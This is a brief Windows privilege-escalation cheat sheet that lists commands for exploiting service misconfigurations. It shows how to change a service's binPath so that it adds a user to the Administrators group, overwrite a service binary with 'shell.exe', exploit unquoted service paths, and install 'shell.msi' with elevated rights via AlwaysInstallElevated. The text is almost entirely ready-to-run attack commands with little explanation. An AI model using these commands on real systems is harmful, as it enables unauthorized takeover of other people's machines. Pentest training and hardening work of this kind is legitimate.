# Windows Service Misconfigurations

## Insecure Service Permissions
```cmd
accesschk.exe -uwcqv "Users" * /accepteula
sc config <service_name> binPath= "cmd /c net localgroup Administrators user /add"
sc stop <service_name>
sc start <service_name>
```

## Weak Service Binary Permissions
```cmd
icacls "C:\Program Files\SomeService\service.exe"
copy /Y shell.exe "C:\Program Files\SomeService\service.exe"
sc start <service_name>
```

## Unquoted Service Paths
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
# "C:\Program Files\My App\Service.exe" → Create C:\Program.exe
```

## AlwaysInstallElevated
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both 1: msiexec /quiet /qn /i shell.msi
```
